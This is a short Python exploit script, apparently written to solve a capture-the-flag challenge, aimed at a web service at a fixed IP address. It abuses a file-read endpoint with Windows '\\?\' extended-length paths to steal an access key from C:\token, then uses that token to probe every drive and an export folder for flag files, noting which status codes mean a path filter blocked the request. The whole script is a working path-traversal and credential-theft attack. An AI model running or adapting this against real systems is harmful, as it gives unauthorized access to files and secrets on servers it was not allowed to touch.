import requests
import string

BASE_URL = "http://1.95.51.2:8080"

def get_token():
    try:
        r = requests.get(f"{BASE_URL}/api/diag/read", params={"path": r"\\?\C:\token\access_key.txt"}, timeout=5)
        if r.status_code == 200:
            data = r.json()
            if data.get("success"):
                return data.get("token")
    except:
        pass
    return None

def check(path):
    t = get_token()
    if not t:
        print("[-] No token")
        return
    
    url = f"{BASE_URL}/api/export/read"
    params = {"path": path, "token": t}
    try:
        r = requests.get(url, params=params, timeout=5)
        # 403 Directory means "Exists/Valid syntax" but wrong dir?
        # 403 UNC/NT means "Blocked".
        # 404 means "File not found".
        # 200 means "Success".
        print(f"Path: {path} -> {r.status_code} {r.text[:100]}")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    drives = string.ascii_uppercase
    for d in drives:
        if d == "C": continue
        check(fr"\\?\{d}:\flag.txt")
        check(fr"\\?\{d}:\backup\flag.txt")

    # Check export dir content
    check(r"\\?\C:\export\flag.txt")
    check(r"\\?\C:\export\backup\flag.txt")
